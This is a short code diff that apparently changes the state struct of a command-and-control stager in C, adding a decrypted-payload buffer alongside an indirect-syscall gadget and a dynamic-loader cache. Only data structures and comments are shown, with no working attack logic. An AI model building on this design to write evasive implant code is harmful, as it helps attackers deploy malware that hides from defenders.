@@ -15,12 +15,16 @@
  * without reserving a general-purpose register (clang has no -ffixed-r15).
  */
 
+#include "stager_iface.h"
 #include "util/dynload.h"
 
 struct stager_state {
-  struct stager_state *self; /* %gs:0 points back here (see get_stager_state) */
-  void *syscall_gadget;      /* resolved vDSO `syscall; ret` gadget */
-  dynload dl;                /* runtime dlopen/dlsym/dlclose cache */
+  /* Published same-process ABI; self must stay at %gs:0 (see below). */
+  struct c2_stager_public pub;
+  void *payload;      /* decrypted payload blob, discarded on first sleep */
+  size_t payload_size;
+  void *syscall_gadget; /* resolved vDSO `syscall; ret` gadget */
+  dynload dl;           /* runtime dlopen/dlsym/dlclose cache */
 };
 
 /* Sentinel value for syscall_gadget before init_indirect_syscalls(). */
